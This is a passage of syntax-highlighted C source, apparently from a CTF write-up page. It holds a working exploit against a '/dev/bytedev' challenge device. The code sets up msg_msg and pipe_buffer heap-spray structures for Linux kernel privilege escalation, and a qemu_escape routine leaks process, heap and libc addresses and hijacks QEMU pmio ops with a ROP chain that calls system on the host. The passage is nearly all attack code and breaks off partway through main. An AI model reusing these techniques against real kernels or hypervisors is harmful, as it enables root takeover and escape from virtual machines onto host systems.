class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_TAG 0xAAAAAAAA</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_TYPE 0x41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_TYPE 0x42</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VICTIM_MSG_TYPE 0x1337</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_BUFF_NUM 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;    <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="keyword">void</span> *next;     <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="keyword">void</span> *security; <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">uint32_t</span> offset, len;</span><br><span class="line">    <span class="keyword">uint64_t</span> ops;</span><br><span class="line">    <span class="keyword">uint32_t</span> flags;</span><br><span class="line">    <span class="keyword">uint32_t</span> padding;</span><br><span class="line">    <span class="keyword">uint64_t</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> confirm;</span><br><span class="line">    <span class="keyword">uint64_t</span> release;</span><br><span class="line">    <span class="keyword">uint64_t</span> try_steal;</span><br><span class="line">    <span class="keyword">uint64_t</span> get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125; primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125; secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    <span class="comment">// system(&quot;/bin/sh&quot;);</span></span><br><span class="line">    qemu_escape();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">100</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">qemu_escape</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/bytedev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open bytedev failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">char</span> *fake_ops = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] leak process base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x114514</span>, <span class="number">1</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-25</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> elf_base = *(<span class="keyword">uint64_t</span> *)buf - <span class="number">0x474039</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> system_addr = elf_base + <span class="number">0x2e0250</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> pmio_read_addr = elf_base + <span class="number">0x474039</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] process base: \033[0m %p\n&quot;</span>, elf_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] system addr: \033[0m %p\n&quot;</span>, system_addr);</span><br><span class="line"></span><br><span class="line">    read(fd, fake_ops, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] leak heap base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-0x186</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> heap_base = *(<span class="keyword">uint64_t</span> *)buf - <span class="number">0x2ae00</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> parent_object = heap_base + <span class="number">0x9f650</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> opaque_addr = heap_base + <span class="number">0x10adc20</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> pmio_ops_addr = opaque_addr + <span class="number">0xb68</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] heap base: \033[0m %p\n&quot;</span>, heap_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] parent_object addr: \033[0m %p\n&quot;</span>, parent_object);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] opaque addr: \033[0m %p\n&quot;</span>, opaque_addr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] leak libc base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-388</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x8</span> * <span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> libc_base = *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x7</span> * <span class="number">8</span>) - <span class="number">0x4385f0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> mov_rsp_rbx = <span class="number">0x5b4d0</span> + libc_base;</span><br><span class="line">    <span class="comment">// mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">    <span class="keyword">uint64_t</span> magic_gadget = <span class="number">0x0000000000151990</span> + libc_base;</span><br><span class="line">    <span class="keyword">uint64_t</span> pop_rdi = <span class="number">0x0000000000023b6a</span> + libc_base;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] libc base: \033[0m %p\n&quot;</span>, libc_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] magic gadget addr: \033[0m %p\n&quot;</span>, magic_gadget);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *command = <span class="string">&quot;nl flag\x00&quot;</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> command_addr = opaque_addr + <span class="number">0xf8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] prepare for hijake pmio-&gt;ops\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ioctl(fd, 0x1919810, -0x16d);</span></span><br><span class="line">    <span class="comment">// read(fd, buf, 0x200);</span></span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-0x18</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">8</span>) = opaque_addr + <span class="number">0x100</span> - <span class="number">0x20</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0xe0</span>) = pop_rdi;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0xe8</span>) = command_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0xf0</span>) = system_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0xf8</span>) = *(<span class="keyword">uint64_t</span> *)command;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x100</span>) = mov_rsp_rbx;</span><br><span class="line"></span><br><span class="line">    write(fd, buf, <span class="number">0x108</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-0x16d</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-6</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake_ops) = pmio_read_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake_ops + <span class="number">8</span>) = magic_gadget;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x30</span> + i * <span class="number">8</span>) = *(<span class="keyword">uint64_t</span> *)(fake_ops + i * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(fd, buf, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] ready to hijack! \033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] hijake pmio-&gt;ops\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-347</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x48</span>) = opaque_addr + <span class="number">0xc28</span>;</span><br><span class="line">    write(fd, buf, <span class="number">0x50</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">0x196082</span>);</span><br><span class="line">    <span class="comment">// ioctl(fd, 0x1919810,);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] done! \033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *point_buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">int</span> victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="keyword">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> victim_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> real_qid;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> search_addr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *rop_chain = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/bytedev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open bytedev failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span 